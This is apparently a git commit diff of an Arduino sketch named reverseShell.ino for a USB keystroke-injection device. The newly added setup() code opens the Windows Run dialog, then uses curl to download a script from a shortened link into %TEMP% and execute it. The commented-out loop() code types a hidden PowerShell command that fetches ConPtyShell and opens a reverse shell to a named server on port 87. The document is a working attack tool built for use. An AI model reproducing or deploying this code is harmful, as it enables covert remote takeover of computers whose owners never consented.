385c33a2a45c19a1393ed186cde95f1925c33569
Jango47 <136978710+Jango47@users.noreply.github.com>
2025-05-12 17:57:54 +0200

    Update reverseShell.ino

--- reverseShell.ino
+++ reverseShell.ino
@@ -2,12 +2,24 @@
 #include "DigiKeyboard.h"
 
 void setup() {
-  delay(500);
+  delay(50);
   DigiKeyboard.disableLEDFeedback();
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200); 
+
+  DigiKeyboard.print("cmd /c curl -sL \"rb.gy/p5t1cu\" -o %TEMP%");
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
+  DigiKeyboard.print("rs.cmd && %TEMP%");
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
+  DigiKeyboard.println("rs.cmd");
+
+  DigiKeyboard.write('\n');
 }
 
+
 void loop() {
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Simulira pritisak Win + R i otvara run
+  /*DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Simulira pritisak Win + R i otvara run
   DigiKeyboard.delay(200); 
 
   DigiKeyboard.println("powershell"); // Otvara powershell
@@ -16,5 +28,5 @@ void loop() {
   DigiKeyboard.println("powershell -WindowStyle Hidden -Command \"IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Resolve-DnsName jangosserver.eu).IPAddress 87\""); // Ispise komandu za spajanje na listener
   DigiKeyboard.enableLEDFeedback();
 
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(5000);*/
 }
